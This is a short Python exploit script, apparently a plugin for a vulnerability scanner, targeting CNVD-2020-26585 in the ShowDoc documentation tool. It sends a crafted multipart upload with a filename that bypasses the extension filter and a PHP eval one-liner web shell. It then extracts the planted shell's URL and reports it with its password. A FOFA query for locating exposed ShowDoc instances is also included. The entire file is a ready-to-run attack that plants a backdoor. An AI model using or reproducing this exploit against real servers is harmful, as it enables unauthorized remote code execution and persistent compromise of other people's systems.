#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from cgi import print_form
import requests
import re

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME = 'CNVD_2020_26585'
AUTHOR = "JDQ"
REMARK = 'ShowDoc前台文件上传getshell'
FOFA_RULE = 'app="ShowDoc" '
######################################################

headers = {'User-Agent': ua,
           'Content-Type': 'multipart/form-data; boundary=--------------------------921378126371623762173617'}


def poc(target):
    result = {}
    data = '''
----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php @eval($_POST[a]);?>
----------------------------921378126371623762173617--'''
    try:
        r = requests.post(target+"/index.php?s=/home/page/uploadImg",
                          headers=headers, data=data, verify=False,proxies=proxies)
        if r.status_code == 200 and r.text:
            resu = re.search(
                '.*"(http.*?.php)".*', r.text
            )
            shellurl = resu.group(1)
            result['target'] = target
            result['poc'] = NAME
            result['shell地址'] = shellurl.replace('\/', '/')
            result['shell密码'] = 'a'
            return result
    except:
        pass


if __name__ == '__main__':
    poc("127.0.0.1")
